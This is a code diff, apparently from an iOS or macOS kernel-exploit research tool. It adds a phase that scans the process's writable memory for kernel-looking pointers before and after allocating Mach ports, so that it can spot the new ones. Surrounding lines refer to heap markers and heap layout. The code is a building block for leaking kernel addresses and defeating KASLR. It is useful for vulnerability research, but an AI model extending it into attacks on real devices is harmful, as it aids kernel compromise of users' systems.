@@ -223,7 +223,104 @@
         [report appendString:@"Try: different marker sizes, or check heap layout.\n"];
     }
 
+    // Phase 4: find kernel pointers belonging to our objects (differential)
+    [report appendString:@"\n--- Phase 4: find our kernel pointers ---\n"];
+
+    // Snapshot kernel pointers BEFORE creating ports
+    #define MAX_KPTRS 256
+    uint64_t kptrsBefore[MAX_KPTRS] = {0};
+    size_t kptrAddrsBefore[MAX_KPTRS] = {0};
+    int kptrCountBefore = 0;
+
+    {
+        vm_address_t sa = 0; vm_size_t ss = 0;
+        vm_region_submap_info_data_64_t si;
+        mach_msg_type_number_t sc;
+        while (1) {
+            sa = (sa == 0) ? 0 : sa + ss;
+            sc = VM_REGION_SUBMAP_INFO_COUNT_64;
+            uint32_t d = 0;
+            if (vm_region_recurse_64(mach_task_self(), &sa, &ss, &d,
+                                      (vm_region_recurse_info_t)&si, &sc) != KERN_SUCCESS) break;
+            if (si.is_submap) continue;
+            if (!(si.protection & VM_PROT_WRITE)) continue;
+            if (ss > 16 * 1024 * 1024) continue;
+
+            volatile uint64_t *p = (volatile uint64_t *)sa;
+            size_t words = ss / 8;
+            for (size_t j = 0; j < words && kptrCountBefore < MAX_KPTRS; j++) {
+                uint64_t v = p[j];
+                if ((v >> 32) >= 0xffffffe0ULL) {
+                    kptrsBefore[kptrCountBefore] = v;
+                    kptrAddrsBefore[kptrCountBefore] = sa + j * 8;
+                    kptrCountBefore++;
+                }
+            }
+        }
+        [report appendFormat:@"kptrs before ports: %d\n", kptrCountBefore];
+    }
+
+    // Create 4 new ports
+    mach_port_t newPorts[4];
+    for (int i = 0; i < 4; i++) {
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &newPorts[i]);
+        [report appendFormat:@"new port[%d]: name=%u\n", i, newPorts[i]];
+    }
+
+    // Snapshot kernel pointers AFTER creating ports
+    uint64_t kptrsAfter[MAX_KPTRS] = {0};
+    size_t kptrAddrsAfter[MAX_KPTRS] = {0};
+    int kptrCountAfter = 0;
+
+    {
+        vm_address_t sa = 0; vm_size_t ss = 0;
+        vm_region_submap_info_data_64_t si;
+        mach_msg_type_number_t sc;
+        while (1) {
+            sa = (sa == 0) ? 0 : sa + ss;
+            sc = VM_REGION_SUBMAP_INFO_COUNT_64;
+            uint32_t d = 0;
+            if (vm_region_recurse_64(mach_task_self(), &sa, &ss, &d,
+                                      (vm_region_recurse_info_t)&si, &sc) != KERN_SUCCESS) break;
+            if (si.is_submap) continue;
+            if (!(si.protection & VM_PROT_WRITE)) continue;
+            if (ss > 16 * 1024 * 1024) continue;
+
+            volatile uint64_t *p = (volatile uint64_t *)sa;
+            size_t words = ss / 8;
+            for (size_t j = 0; j < words && kptrCountAfter < MAX_KPTRS; j++) {
+                uint64_t v = p[j];
+                if ((v >> 32) >= 0xffffffe0ULL) {
+                    kptrsAfter[kptrCountAfter] = v;
+                    kptrAddrsAfter[kptrCountAfter] = sa + j * 8;
+                    kptrCountAfter++;
+                }
+            }
+        }
+        [report appendFormat:@"kptrs after ports: %d\n", kptrCountAfter];
+    }
+
+    // Find NEW kernel pointers (not in before snapshot)
+    int newKptrs = 0;
+    for (int i = 0; i < kptrCountAfter && newKptrs < 10; i++) {
+        BOOL isnew = YES;
+        for (int j = 0; j < kptrCountBefore; j++) {
+            if (kptrsAfter[i] == kptrsBefore[j]) {
+                isnew = NO;
+                break;
+            }
+        }
+        if (isnew) {
+            [report appendFormat:@"NEW kptr: 0x%llx at +0x%lx\n", kptrsAfter[i], (unsigned long)kptrAddrsAfter[i]];
+            newKptrs++;
+        }
+    }
+    [report appendFormat:@"new kernel pointers from our ports: %d\n", newKptrs];
+
     // Cleanup
+    for (int i = 0; i < 4; i++) {
+        if (newPorts[i] != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), newPorts[i]);
+    }
     for (int i = 0; i < MARKER_COUNT; i++) {
         free(markers[i]);
     }
